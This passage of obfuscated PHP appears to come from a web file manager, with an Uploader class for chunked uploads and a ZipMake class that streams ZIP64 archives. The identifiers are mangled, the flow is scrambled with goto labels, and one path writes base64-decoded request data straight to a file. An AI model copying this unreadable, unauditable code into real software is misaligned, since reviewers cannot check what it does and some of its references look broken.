eêœĞØƒÙë: if (IO::exist($E¦Ğ§¿šÔœ)) { return !0; } $a×íÊ‘‰Æ  = get_path_father($E¦Ğ§¿šÔœ); if (IO::exist($a×íÊ‘‰Æ )) { $dáåÔ—ô‚£[] = $d¯“ô¢Å‰[$f¾©Ç•Ú…¿[415]]; return !1; } goto F‰×Ø±ÙÌ„; AÜ½ƒÓŞŒ¬: return !1; goto AÚÚ†’¦Šã; F‰×Ø±ÙÌ„: $a‹šá¨˜‘“ = array($f¾©Ç•Ú…¿[709] => $d¯“ô¢Å‰[$f¾©Ç•Ú…¿[709]], $f¾©Ç•Ú…¿[76] => array($f¾©Ç•Ú…¿[747], "{$a×íÊ‘‰Æ }\x25")); $Dƒİ Ëë = Model($f¾©Ç•Ú…¿[708])->where($a‹šá¨˜‘“)->field($f¾©Ç•Ú…¿[416])->select(); $dáåÔ—ô‚£ = array_merge($dáåÔ—ô‚£, array_to_keyvalue($Dƒİ Ëë, $f¾©Ç•Ú…¿[33], $f¾©Ç•Ú…¿[415])); goto AÜ½ƒÓŞŒ¬; AÚÚ†’¦Šã: } private function _fileFilter($D»µï–††À) { $C…×‹Í¦ÅÓ =& $_SERVER[÷ÖêïÔÔÓ]; if (empty($D»µï–††À)) { return; } $fÆ‘ó´¥•ˆ = array($C…×‹Í¦ÅÓ[415] => array($C…×‹Í¦ÅÓ[7], array_unique($D»µï–††À))); $EñšÉéø‘ = Model($C…×‹Í¦ÅÓ[748])->where($fÆ‘ó´¥•ˆ)->field($C…×‹Í¦ÅÓ[366])->select(); foreach ($EñšÉéø‘ as $e§ŞÌÕ†´ù) { Model($C…×‹Í¦ÅÓ[748])->remove($e§ŞÌÕ†´ù[$C…×‹Í¦ÅÓ[366]], !1); } } } goto d¼ÅÅÓ‘šâ; aí§¼‡÷: class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto fŒ¬è¿Úß°; fŒ¬è¿Úß°: $A‹±¼ÙÔõš =& $_SERVER[÷ÖêïÔÔÓ]; global $in; $this->in =& $in; goto b µ‡…; b µ‡…: if (!empty($_FILES)) { $bõ¥áºÛ‚© = $_FILES[$A‹±¼ÙÔõš[164]]; $this->uploadFile = $bõ¥áºÛ‚©[$A‹±¼ÙÔõš[1868]]; if (!$this->uploadFile && $bõ¥áºÛ‚©[$A‹±¼ÙÔõš[1178]] > 0) { show_json($this->errorInfo($bõ¥áºÛ‚©[$A‹±¼ÙÔõš[1178]]), !1); } } else { if (isset($in[$A‹±¼ÙÔõš[383]])) { $this->uploadFile = isset($in[$A‹±¼ÙÔõš[1869]]) ? $A‹±¼ÙÔõš[1870] : $A‹±¼ÙÔõš[1712]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto B¾Áù—Ûê—; B¾Áù—Ûê—: $this->checkSize(); $this->tempPathInit(); goto E˜ŠÆÁ®œÊ; E˜ŠÆÁ®œÊ: } public function upload() { goto eåíÔåÖö‘; d†ÛŠéé: if ($E÷Êµ”“ÍÜ > 1 && $C‰‚Ò‰Ûáê <= 0) { show_json($B©ãÈÎ¥Ëˆ[1875], !1); } if ($C‰‚Ò‰Ûáê > $FæàîÙøÆ) { $E÷Êµ”“ÍÜ = 1; } if ($E÷Êµ”“ÍÜ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto aÜ‘Õ•„µá; eåíÔåÖö‘: $B©ãÈÎ¥Ëˆ =& $_SERVER[÷ÖêïÔÔÓ]; $E¡º”œ£· = isset($this->in[$B©ãÈÎ¥Ëˆ[1871]]) ? intval($this->in[$B©ãÈÎ¥Ëˆ[1871]]) : 0; $E÷Êµ”“ÍÜ = isset($this->in[$B©ãÈÎ¥Ëˆ[1872]]) ? intval($this->in[$B©ãÈÎ¥Ëˆ[1872]]) : 1; goto F¤ëçÖ²Ğä; eéº®À†‰ì: CacheLock::unlock($this->tempFile); return $this->tempFile; goto Bà‹‘¥êğ; cóÅ²£ë­: $B¶¸¶¦ò¯Ù[$B©ãÈÎ¥Ëˆ[1881]][$B©ãÈÎ¥Ëˆ[1882] . $E¡º”œ£·] = array($B©ãÈÎ¥Ëˆ[1883] => $EŠ™«ö–¬‹, $B©ãÈÎ¥Ëˆ[1010] => $E¡º”œ£·, $B©ãÈÎ¥Ëˆ[78] => $FæàîÙøÆ, $B©ãÈÎ¥Ëˆ[161] => $bë½àƒª¸†); $this->statusSet($B¶¸¶¦ò¯Ù); if (count($B¶¸¶¦ò¯Ù[$B©ãÈÎ¥Ëˆ[1881]]) != $B¶¸¶¦ò¯Ù[$B©ãÈÎ¥Ëˆ[1880]]) { $this->showJson($B©ãÈÎ¥Ëˆ[1884] . $E¡º”œ£·, !0); } goto cô…Üä»‰Š; Fø†µóÑÍğ: @unlink($eËçêØ¹Šà); if (!$F¨±ÕÂİ—ó) { $this->showJson($B©ãÈÎ¥Ëˆ[1879] . $E¡º”œ£·, !1); } $B¶¸¶¦ò¯Ù[$B©ãÈÎ¥Ëˆ[1880]] = $E÷Êµ”“ÍÜ; goto cóÅ²£ë­; Bõ¤š» ›: $EŠ™«ö–¬‹ = $E¡º”œ£· * $C‰‚Ò‰Ûáê; $dÇÏšÖÛ” = @fopen($this->tempFile, $B©ãÈÎ¥Ëˆ[1878]); fseek($dÇÏšÖÛ”, $EŠ™«ö–¬‹); goto Eà©ÇãÊ¾Ã; F¤ëçÖ²Ğä: $EšĞ˜…Ó§ø = $this->tempFile . $B©ãÈÎ¥Ëˆ[1873] . $E¡º”œ£·; $FæàîÙøÆ = isset($this->in[$B©ãÈÎ¥Ëˆ[513]]) ? intval($this->in[$B©ãÈÎ¥Ëˆ[513]]) : 0; $C‰‚Ò‰Ûáê = isset($this->in[$B©ãÈÎ¥Ëˆ[1874]]) ? intval($this->in[$B©ãÈÎ¥Ëˆ[1874]]) : 0; goto d†ÛŠéé; C‹ÜÊóÃ–: $eËçêØ¹Šà = $this->moveUploadedFile($EšĞ˜…Ó§ø); if ($FæàîÙøÆ > 0 && filesize($eËçêØ¹Šà) == 0) { $this->showJson($B©ãÈÎ¥Ëˆ[1876], !1); } if (!$eËçêØ¹Šà) { $this->showJson(LNG($B©ãÈÎ¥Ëˆ[1877]), !1); } goto Bõ¤š» ›; aÜ‘Õ•„µá: CacheLock::lock($this->tempFile, 20); $B¶¸¶¦ò¯Ù = $this->statusGet(); $this->initFileTemp(); goto C‹ÜÊóÃ–; Eà©ÇãÊ¾Ã: $F¨±ÕÂİ—ó = $this->writeTo($eËçêØ¹Šà, $dÇÏšÖÛ”, $this->tempFile); $bë½àƒª¸† = IO::hashSimple($eËçêØ¹Šà); $FæàîÙøÆ = IO::size($eËçêØ¹Šà); goto Fø†µóÑÍğ; cô…Üä»‰Š: ignore_timeout(); if (!$this->checkChunkHash($B¶¸¶¦ò¯Ù)) { $this->showJson($B©ãÈÎ¥Ëˆ[1885], !1); } $this->statusSet(!1); goto eéº®À†‰ì; Bà‹‘¥êğ: } private function checkSize() { $cÄ§ÏÁğçÌ =& $_SERVER[÷ÖêïÔÔÓ]; if (phpBuild64() || $this->in[$cÄ§ÏÁğçÌ[78]] < PHP_INT_MAX) { return; } show_json(LNG($cÄ§ÏÁğçÌ[1886]), !1); } private function showJson($a®í„ø¹Ÿ, $f‹›æÕÀè’) { CacheLock::unlock($this->tempFile); if (!$f‹›æÕÀè’) { return show_json($a®í„ø¹Ÿ, $f‹›æÕÀè’); } show_json($a®í„ø¹Ÿ, $f‹›æÕÀè’); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto EÈŒ¸•÷œÔ; EÈŒ¸•÷œÔ: $bëê³ÌŞçé =& $_SERVER[÷ÖêïÔÔÓ]; $c„—èìçÍ = TEMP_FILES; @mk_dir($c„—èìçÍ); goto E ¬ĞÜ°Õ¦; aŸ»Ğæİï: $this->tempFile = $c„—èìçÍ . $bëê³ÌŞçé[1889] . md5($F†à§ŒæĞÅ . $this->in[$bëê³ÌŞçé[1431]]); goto CÉ¶•ôùÑ§; E ¬ĞÜ°Õ¦: touch($c„—èìçÍ . $bëê³ÌŞçé[1887]); $F†à§ŒæĞÅ = isset($this->in[$bëê³ÌŞçé[1888]]) ? $this->in[$bëê³ÌŞçé[1888]] : !1; if (strlen($F†à§ŒæĞÅ) < 30) { $F†à§ŒæĞÅ = md5(USER_ID . $this->in[$bëê³ÌŞçé[76]] . $this->fileName . $this->in[$bëê³ÌŞçé[78]]); } goto aŸ»Ğæİï; CÉ¶•ôùÑ§: } private function moveUploadedFile($d·„¼‡Ÿî) { $eóÒ¥œà›… =& $_SERVER[÷ÖêïÔÔÓ]; $AğÁ÷áàğ = $this->uploadFile; if ($AğÁ÷áàğ == $eóÒ¥œà›…[1890]) { @file_put_contents($d·„¼‡Ÿî, base64_decode($_REQUEST[$eóÒ¥œà›…[1891]])); } else { if ($AğÁ÷áàğ == $eóÒ¥œà›…[1712]) { $A‚ƒÁ° „À = @fopen($d·„¼‡Ÿî, $eóÒ¥œà›…[1421]); $this->writeTo($AğÁ÷áàğ, $A‚ƒÁ° „À, $d·„¼‡Ÿî); } else { if (!move_uploaded_file($AğÁ÷áàğ, $d·„¼‡Ÿî)) { return !1; } } } return $d·„¼‡Ÿî; } private function writeTo($dæõÖÑ¼–•, $bİ³àƒĞÑ, $d•±ˆœ«”†) { goto aÂŞíÁÆ§; d„ù‹³¢ŠÖ: fclose($c–­è–‹†„); fclose($bİ³àƒĞÑ); CacheLock::unlock($C÷¬†ó¾İÈ); goto d›–“ë‚‚; aÂŞíÁÆ§: $Cñ·ÁªÜî =& $_SERVER[÷ÖêïÔÔÓ]; $C÷¬†ó¾İÈ = $Cñ·ÁªÜî[1892] . $d•±ˆœ«”†; $EëÃßêÊ = CacheLock::lock($C÷¬†ó¾İÈ, 1); goto AÓ¦Œ›÷“¹; AÓ¦Œ›÷“¹: $c–­è–‹†„ = @fopen($dæõÖÑ¼–•, $Cñ·ÁªÜî[1420]); if (!$c–­è–‹†„ || !$bİ³àƒĞÑ || !$EëÃßêÊ) { CacheLock::unlock($C÷¬†ó¾İÈ); return !1; } while (!feof($c–­è–‹†„)) { fwrite($bİ³àƒĞÑ, fread($c–­è–‹†„, 1024 * 200)); } goto d„ù‹³¢ŠÖ; d›–“ë‚‚: return !0; goto EÅ„ğç×…Œ; EÅ„ğç×…Œ: } private function statusGet() { goto Fä×äƒëÜÈ; C·¢¿•°ì: if (!$this->statusData) { $E¢Õ‰‘Íˆ¶ = array($EÚ º‚ç½ã[28] => $this->fileName, $EÚ º‚ç½ã[1880] => 0, $EÚ º‚ç½ã[1881] => array()); $this->statusSet($E¢Õ‰‘Íˆ¶); } return $this->statusData; goto b†®ùŞæÕ; AŒ½Ä‚: $fó¼Œö·¬ = !1; if (file_exists($A‘„À´øÉ)) { $fó¼Œö·¬ = @file_get_contents($A‘„À´øÉ); } if ($fó¼Œö·¬) { $this->statusData = unserialize($fó¼Œö·¬); } goto C·¢¿•°ì; Fä×äƒëÜÈ: $EÚ º‚ç½ã =& $_SERVER[÷ÖêïÔÔÓ]; if (is_array($this->statusData)) { return $this->statusData; } $A‘„À´øÉ = $this->tempFile . $EÚ º‚ç½ã[1893]; goto AŒ½Ä‚; b†®ùŞæÕ: } public function statusSet($E¤ôØêËì…) { $DŞïóïò·© = $this->tempFile . $_SERVER[÷ÖêïÔÔÓ][1893]; if (!$E¤ôØêËì…) { if (file_exists($DŞïóïò·©)) { @unlink($DŞïóïò·©); } return !0; } $this->statusData = $E¤ôØêËì…; return file_put_contents($DŞïóïò·©, serialize($E¤ôØêËì…)); } private function initFileTemp() { $aãàÕŒå‹ =& $_SERVER[÷ÖêïÔÔÓ]; if (file_exists($this->tempFile)) { return; } $c—°øµ¶Ûï = fopen($this->tempFile, $aãàÕŒå‹[1894]); fseek($c—°øµ¶Ûï, $this->in[$aãàÕŒå‹[78]] - 1, SEEK_SET); fwrite($c—°øµ¶Ûï, $aãàÕŒå‹[464]); fclose($c—°øµ¶Ûï); } public function checkChunk() { goto DÏ•Ÿ¯Ø­; aë®ø£ŞÂô: return $bŸÇ»Ë¨; goto dˆÄƒé«Ÿò; DÏ•Ÿ¯Ø­: $EšŒ˜Î ‡¡ =& $_SERVER[÷ÖêïÔÔÓ]; $bŸÇ»Ë¨ = array(); CacheLock::lock($this->tempFile); goto b–¨²‹æ¸«; b–¨²‹æ¸«: $eåÄá¿©¤ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($eåÄá¿©¤[$EšŒ˜Î ‡¡[1881]] as $dŸÊµç“é©) { $c¢‘Ä¥é½˜ = $dŸÊµç“é©[$EšŒ˜Î ‡¡[161]]; if ($c¢‘Ä¥é½˜) { $bŸÇ»Ë¨[$EšŒ˜Î ‡¡[1895] . $dŸÊµç“é©[$EšŒ˜Î ‡¡[1010]]] = $c¢‘Ä¥é½˜; } } goto aë®ø£ŞÂô; dˆÄƒé«Ÿò: } private function checkChunkHash($A‘çÉÆª»Ş) { goto C•±ãÉÀ˜ó; DÖ³ŒÆ”Ëâ: $cÀŠ±‰Ñ° = !0; foreach ($A‘çÉÆª»Ş[$A¯É“¡ô²ö[1881]] as $aåó‰¶ÈŒ³) { fseek($bÅî¶²óÃ , $aåó‰¶ÈŒ³[$A¯É“¡ô²ö[1883]]); $fïîåÔÁŸ– = PathDriverStream::hash($bÅî¶²óÃ , $aåó‰¶ÈŒ³[$A¯É“¡ô²ö[78]]); if ($aåó‰¶ÈŒ³[$A¯É“¡ô²ö[161]] != $fïîåÔÁŸ–) { $cÀŠ±‰Ñ° = !1; break; } } fclose($bÅî¶²óÃ ); goto aÁ¥é¿ô“‹; b­ÑÇæš¿Ç: $fÌá¥©’‡ç = _get($this->in, $A¯É“¡ô²ö[1896]); if (strlen($fÌá¥©’‡ç) == 32 && IO::hashSimple($this->tempFile) == $aÏÔ‰ÈÏ¾Î && IO::hashMd5($this->tempFile) == $fÌá¥©’‡ç) { return !0; } $bÅî¶²óÃ  = fopen($this->tempFile, $A¯É“¡ô²ö[1128]); goto DÖ³ŒÆ”Ëâ; aÁ¥é¿ô“‹: return $cÀŠ±‰Ñ°; goto A‚Ò¢ä¼Á; C•±ãÉÀ˜ó: $A¯É“¡ô²ö =& $_SERVER[÷ÖêïÔÔÓ]; if (count($A‘çÉÆª»Ş[$A¯É“¡ô²ö[1881]]) != $A‘çÉÆª»Ş[$A¯É“¡ô²ö[1880]]) { return !1; } $aÏÔ‰ÈÏ¾Î = _get($this->in, $A¯É“¡ô²ö[1888]); goto b­ÑÇæš¿Ç; A‚Ò¢ä¼Á: } public static function fileName() { goto DÃò£Æœ¹¥; BÏÙ–•Ííä: if (!empty($_FILES)) { $aÖ¤ê‘ŠÓÇ = $aÖ¤ê‘ŠÓÇ ? $aÖ¤ê‘ŠÓÇ : $_FILES[$b¾ƒ¶¬¢±[164]][$b¾ƒ¶¬¢±[383]]; } $aÖ¤ê‘ŠÓÇ = str_replace(array($b¾ƒ¶¬¢±[94], $b¾ƒ¶¬¢±[8]), array($b¾ƒ¶¬¢±[8], $b¾ƒ¶¬¢±[92]), trim($aÖ¤ê‘ŠÓÇ)); if (!is_wap()) { return $aÖ¤ê‘ŠÓÇ; } goto C×Å™á®Ší; C×Å™á®Ší: $e’—’œ¨ = strtotime($in[$b¾ƒ¶¬¢±[1897]]); $e’—’œ¨ = $e’—’œ¨ ? $e’—’œ¨ : time(); $C¨›¼ªÍ¬© = strtolower($aÖ¤ê‘ŠÓÇ); goto Eã¹î›‡„‘; Eã¹î›‡„‘: if ($C¨›¼ªÍ¬© == $b¾ƒ¶¬¢±[1898] || $C¨›¼ªÍ¬© == $b¾ƒ¶¬¢±[1899]) { $aÖ¤ê‘ŠÓÇ = date($b¾ƒ¶¬¢±[676], $e’—’œ¨) . $b¾ƒ¶¬¢±[71] . $in[$b¾ƒ¶¬¢±[78]] . $b¾ƒ¶¬¢±[1527]; } else { if ($C¨›¼ªÍ¬© == $b¾ƒ¶¬¢±[1900]) { $aÖ¤ê‘ŠÓÇ = date($b¾ƒ¶¬¢±[676], $e’—’œ¨) . $b¾ƒ¶¬¢±[71] . $in[$b¾ƒ¶¬¢±[78]] . $b¾ƒ¶¬¢±[1901]; } } return $aÖ¤ê‘ŠÓÇ; goto Cîƒ°ÀìÌ’; DÃò£Æœ¹¥: $b¾ƒ¶¬¢± =& $_SERVER[÷ÖêïÔÔÓ]; global $in; $aÖ¤ê‘ŠÓÇ = isset($in[$b¾ƒ¶¬¢±[28]]) ? $in[$b¾ƒ¶¬¢±[28]] : $b¾ƒ¶¬¢±[33]; goto BÏÙ–•Ííä; Cîƒ°ÀìÌ’: } private function errorInfo($e«ÍªšŠôÄ) { $dšï‡äâ¯· =& $_SERVER[÷ÖêïÔÔÓ]; $B¿ôé»Âùˆ = array($dšï‡äâ¯·[1902], $dšï‡äâ¯·[1903], $dšï‡äâ¯·[1904], $dšï‡äâ¯·[1905], $dšï‡äâ¯·[1906], $dšï‡äâ¯·[1907], $dšï‡äâ¯·[1908], $dšï‡äâ¯·[1909]); return $e«ÍªšŠôÄ . $dšï‡äâ¯·[4] . $B¿ôé»Âùˆ[$e«ÍªšŠôÄ]; } } class ZipMake { const VERSION = "\x30\x2e\62\56\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($b±®ÆÚÇ¥ã = null) { $b§ò£¨·Ò” =& $_SERVER[÷ÖêïÔÔÓ]; $this->outputStream = fopen($b§ò£¨·Ò”[1910], $b§ò£¨·Ò”[1184]); $this->outputName = $b±®ÆÚÇ¥ã; $this->needHeaders = !0; } public function addFile($d‰ï”è¬—–, $eïÜ—õ¬§Ö) { goto F“äåÏùò§; F“äåÏùò§: $cË²Ø–à =& $_SERVER[÷ÖêïÔÔÓ]; $d‰ï”è¬—– = $this->filterFilename($d‰ï”è¬—–); $EŠ¹—ë©‡Ñ = static::METHOD_STORE; goto fË§á²Š›; eÌ©©Åµø‹: while (!feof($bæ¿ÈøÇˆ”)) { $EÚÌÄ–®ùÄ = fread($bæ¿ÈøÇˆ”, 1048576); $this->send($EÚÌÄ–®ùÄ); } fclose($bæ¿ÈøÇˆ”); $D‚²‚øá¹¤ = hexdec(hash_file($cË²Ø–à[1912], $eïÜ—õ¬§Ö)); goto dó„šêÄÒ¯; fË§á²Š›: $dàíù…ğ¨Ê = $this->addFileHeader($d‰ï”è¬—–, $EŠ¹—ë©‡Ñ); $E®ª‡°Ğªº = $d‚à¾¬½‹ñ = filesize($eïÜ—õ¬§Ö); $bæ¿ÈøÇˆ” = fopen($eïÜ—õ¬§Ö, $cË²Ø–à[1911]); goto eÌ©©Åµø‹; dó„šêÄÒ¯: $this->addFileFooter($d‰ï”è¬—–, $EŠ¹—ë©‡Ñ, $D‚²‚øá¹¤, $E®ª‡°Ğªº, $d‚à¾¬½‹ñ, $dàíù…ğ¨Ê); goto D´†Ï¯Úº; D´†Ï¯Úº: } public function addFileFromStream($f¢å˜ìŸŠƒ, $AÈ¼Ù™Ò) { goto D‘Š°Ä¸ì±; D‘Š°Ä¸ì±: $f¢å˜ìŸŠƒ = $this->filterFilename($f¢å˜ìŸŠƒ); $eÈ›¸ÆÑ‰æ = static::METHOD_STORE; $Dñ¶ÓƒÔ§ = $this->addFileHeader($f¢å˜ìŸŠƒ, $eÈ›¸ÆÑ‰æ); goto càå¼ä”—; càå¼ä”—: fseek($AÈ¼Ù™Ò, 0, SEEK_END); $FµÕáÀ·Œ = $eÔù¬ó‚¦¡ = ftell($AÈ¼Ù™Ò); rewind($AÈ¼Ù™Ò); goto AÆ ¢·‡Ô¬; a¸ãĞ³É–à: $this->addFileFooter($f¢å˜ìŸŠƒ, $eÈ›¸ÆÑ‰æ, $eÇöŠêà¸, $FµÕáÀ·Œ, $eÔù¬ó‚¦¡, $Dñ¶ÓƒÔ§); goto fó±•ÄÊÆâ; AÆ ¢·‡Ô¬: $c«ºÔ‰õ‹ = hash_init($_SERVER[÷ÖêïÔÔÓ][1912]); while (!feof($AÈ¼Ù™Ò)) { $cÀï‰¤» = fread($AÈ¼Ù™Ò, 1048576); hash_update($c«ºÔ‰õ‹, $cÀï‰¤»); $this->send($cÀï‰¤»); } $eÇöŠêà¸ = hexdec(hash_final($c«ºÔ‰õ‹)); goto a¸ãĞ³É–à; fó±•ÄÊÆâ: } public function finish() { foreach ($this->files as $cÑ—©—…•Ç) { $this->addCdrFile($cÑ—©—…•Ç); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($E°â‹‡Ç§, $EàŞò É÷µ) { goto C’•††ĞÉ´; C¸ªÅ®ğŠ«: $càÎ¶§öá = $this->packFields($c±“§ÎÊÛœ); $bêõÎÀä‚¿ = $this->packFields($dîæªÍƒ×¼); $this->send($càÎ¶§öá . $E°â‹‡Ç§ . $bêõÎÀä‚¿); goto c±×±åÇŠè; c±×±åÇŠè: return strlen($càÎ¶§öá) + $cƒÕ„Ò¢¸ï + strlen($bêõÎÀä‚¿); goto fçİ¢Ä¦¤Ò; C’•††ĞÉ´: $BƒÖ³Íğ³é =& $_SERVER[÷ÖêïÔÔÓ]; $E°â‹‡Ç§ = preg_replace($BƒÖ³Íğ³é[1913], $BƒÖ³Íğ³é[33], $E°â‹‡Ç§); $cƒÕ„Ò¢¸ï = strlen($E°â‹‡Ç§); goto C÷ó½»ñˆ; C÷ó½»ñˆ: $E÷êÜå¹ò” = $this->dosTime(time()); $c±“§ÎÊÛœ = array(array($BƒÖ³Íğ³é[1914], static::FILE_HEADER_SIGNATURE), array($BƒÖ³Íğ³é[1915], static::ZIP_VERSION_64), array($BƒÖ³Íğ³é[1915], 8), array($BƒÖ³Íğ³é[1915], $EàŞò É÷µ), array($BƒÖ³Íğ³é[1914], $E÷êÜå¹ò”), array($BƒÖ³Íğ³é[1914], 0), array($BƒÖ³Íğ³é[1914], 4294967295), array($BƒÖ³Íğ³é[1914], 4294967295), array($BƒÖ³Íğ³é[1915], $cƒÕ„Ò¢¸ï), array($BƒÖ³Íğ³é[1915], 32)); $dîæªÍƒ×¼ = array(array($BƒÖ³Íğ³é[1915], 1), array($BƒÖ³Íğ³é[1915], 28), array($BƒÖ³Íğ³é[1916], 0), array($BƒÖ³Íğ³é[1916], 0), array($BƒÖ³Íğ³é[1916], 0), array($BƒÖ³Íğ³é[1914], 0)); goto C¸ªÅ®ğŠ«; fçİ¢Ä¦¤Ò: } protected function addFileFooter($D‘Ñ£Ã¬, $A·¦Ì¢š‘, $f‚™ˆœ²óæ, $cÀ¡®³İŞ, $cŒ²ìÑç£Ú, $câ¡óŸ²‡) { $EÖµâ¥Û¹ =& $_SERVER[÷ÖêïÔÔÓ]; $D„˜´êÒš = array(array($EÖµâ¥Û¹[1914], static::DATA_DESCRIPTOR_SIGNATURE), array($EÖµâ¥Û¹[1914], $f‚™ˆœ²óæ), array($EÖµâ¥Û¹[1916], $cÀ¡®³İŞ), array($EÖµâ¥Û¹[1916], $cŒ²ìÑç£Ú)); $d”Ô‡¯˜¥ = $this->packFields($D„˜´êÒš); $this->send($d”Ô‡¯˜¥); $fóéÙ™×Â = $câ¡óŸ²‡ + $cÀ¡®³İŞ + $f‘õ¾©êæÆ; $this->addToCdr($D‘Ñ£Ã¬, $A·¦Ì¢š‘, $f‚™ˆœ²óæ, $cÀ¡®³İŞ, $cŒ²ìÑç£Ú, $fóéÙ™×Â); } private function addToCdr($DÅ‡™Àåô¨, $E¬¬õŞ±ï‘, $fæ¡ö¨§ƒ, $aÆÛä…ã²ñ, $E¿±šÙÂÁ‰, $e×Û—™¢©) { $this->files[] = array($DÅ‡™Àåô¨, $E¬¬õŞ±ï‘, $fæ¡ö¨§ƒ, $aÆÛä…ã²ñ, $E¿±šÙÂÁ‰, $this->ofs); $this->ofs += $e×Û—™¢©; } protected function addCdrFile($B¼¬…” ë“) { goto DŠŒ¥‹Íà; f¾õØî£Ê: $F‡”ó®éÂê = $this->packFields($C„éÅŸ‰×İ); $Aæ§ê…Ì = $this->packFields($E†î¦ÇÂè); $AÔ®—¿•â = $F‡”ó®éÂê . $eä‚¨¸‡„è . $E˜µ´‚¦›ë . $Aæ§ê…Ì; goto d‡­ØÛµØƒ; DŠŒ¥‹Íà: $fîÚ•‰ŞÇ² =& $_SERVER[÷ÖêïÔÔÓ]; list($eä‚¨¸‡„è, $Bö¥š“Á, $D„ƒ´…à‚, $D¶Ë¤Âìã, $aÜÏßŞùŸĞ, $AçÈ¬°É) = $B¼¬…” ë“; $E˜µ´‚¦›ë = $fîÚ•‰ŞÇ²[33]; goto D÷Å…¶¼ƒ©; d‡­ØÛµØƒ: $this->send($AÔ®—¿•â); $this->cdr_ofs += strlen($AÔ®—¿•â); goto F¥¡£Ì±­; D÷Å…¶¼ƒ©: $EÊ†˜– = $this->dosTime(time()); $C„éÅŸ‰×İ = array(array($fîÚ•‰ŞÇ²[1914], static::CDR_FILE_SIGNATURE), array($fîÚ•‰ŞÇ²[1915], static::ZIP_VERSION_64), array($fîÚ•‰ŞÇ²[1915], static::ZIP_VERSION_64), array($fîÚ•‰ŞÇ²[1915], 8), array($fîÚ•‰ŞÇ²[1915], $Bö¥š“Á), array($fîÚ•‰ŞÇ²[1914], $EÊ†˜–), array($fîÚ•‰ŞÇ²[1914], $D„ƒ´…à‚), array($fîÚ•‰ŞÇ²[1914], 4294967295), array($fîÚ•‰ŞÇ²[1914], 4294967295), array($fîÚ•‰ŞÇ²[1915], strlen($eä‚¨¸‡„è)), array($fîÚ•‰ŞÇ²[1915], 32), array($fîÚ•‰ŞÇ²[1915], strlen($E˜µ´‚¦›ë)), array($fîÚ•‰ŞÇ²[1915], 0), array($fîÚ•‰ŞÇ²[1915], 0), array($fîÚ•‰ŞÇ²[1914], 32), array($fîÚ•‰ŞÇ²[1914], 4294967295)); $E†î¦ÇÂè = array(array($fîÚ•‰ŞÇ²[1915], 1), array($fîÚ•‰ŞÇ²[1915], 28), array($fîÚ•‰ŞÇ²[1916], $aÜÏßŞùŸĞ), array($fîÚ•‰ŞÇ²[1916], $D¶Ë¤Âìã), array($fîÚ•‰ŞÇ²[1916], $AçÈ¬°É), array($fîÚ•‰ŞÇ²[1914], 0)); goto f¾õØî£Ê; F¥¡£Ì±­: } protected function addCdr64Eof() { goto c¶À¯…•Ö¡; c¶À¯…•Ö¡: $CŠÏ¡â¥– =& $_SERVER[÷ÖêïÔÔÓ]; $D±Ì‘æ¸ù† = count($this->files); $A´µà‰×ò‡ = $this->cdr_ofs; goto A‘«Àùï‘; A‘«Àùï‘: $Eİ†¬’â„– = $this->ofs; $D¾Ÿ¢Š“õ = array(array($CŠÏ¡â¥–[1914], static::ZIP64_CDR_EOF_SIGNATURE), array($CŠÏ¡â¥–[1916], 44), array($CŠÏ¡â¥–[1915], static::ZIP_VERSION_64), array($CŠÏ¡â¥–[1915], static::ZIP_VERSION_64), array($CŠÏ¡â¥–[1914], 0), array($CŠÏ¡â¥–[1914], 0), array($CŠÏ¡â¥–[1916], $D±Ì‘æ¸ù†), array($CŠÏ¡â¥–[1916], $D±Ì‘æ¸ù†), array($CŠÏ¡â¥–[1916], $A´µà‰×ò‡), array($CŠÏ¡â¥–[1916], $Eİ†¬’â„–)); $CÏç•¿ã®… = $this->packFields($D¾Ÿ¢Š“õ); goto eï–ï£É¯; eï–ï£É¯: $this->send($CÏç•¿ã®…); goto F•¹àÕÙ‚š; F•¹àÕÙ‚š: } protected function addCdr64Locator() { goto e—Ä§ñ‰„®; Cô£”ÎØÙ´: $C«Ôß¢’µ = $this->ofs; $aô©™„°ùì = array(array($FÂ¼›İ[1914], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($FÂ¼›İ[1914], 0), array($FÂ¼›İ[1916], $C«Ôß¢’µ + $AØ‘¾Œà¶), array($FÂ¼›İ[1914], 1)); $E¾„æÀÚ´¯ = $this->packFields($aô©™„°ùì); goto c¨Œëø…‹Ö; c¨Œëø…‹Ö: $this->send($E¾„æÀÚ´¯); goto e¯è¢—²äŒ; e—Ä§ñ‰„®: $FÂ¼›İ =& $_SERVER[÷ÖêïÔÔÓ]; $C˜Ó…¡Õ¢× = count($this->files); $AØ‘¾Œà¶ = $this->cdr_ofs; goto Cô£”ÎØÙ´; e¯è¢—²äŒ: } protected function addCdrEof() { goto B´ä”º„; B´ä”º„: $Añ·îª´Í– =& $_SERVER[÷ÖêïÔÔÓ]; $AÛ‚ ®Úõ = count($this->files); $C¯Ğ‹ßõĞì = $this->cdr_ofs; goto bÑÀªŠ®ãƒ; AáçÑ‰Ê¡: $fËÅö±­ï§ = $this->packFields($dØ÷Ì“ß¿æ) . $B×¾’Ì¾š™; $this->send($fËÅö±­ï§); goto a³ æ«Æèä; bÑÀªŠ®ãƒ: $bá‹êÇ°Çİ = $this->ofs; $B×¾’Ì¾š™ = $Añ·îª´Í–[33]; $dØ÷Ì“ß¿æ = array(array($Añ·îª´Í–[1914], static::CDR_EOF_SIGNATURE), array($Añ·îª´Í–[1915], 0), array($Añ·îª´Í–[1915], 0), array($Añ·îª´Í–[1915], $AÛ‚ ®Úõ), array($Añ·îª´Í–[1915], $AÛ‚ ®Úõ), array($Añ·îª´Í–[1914], 4294967295), 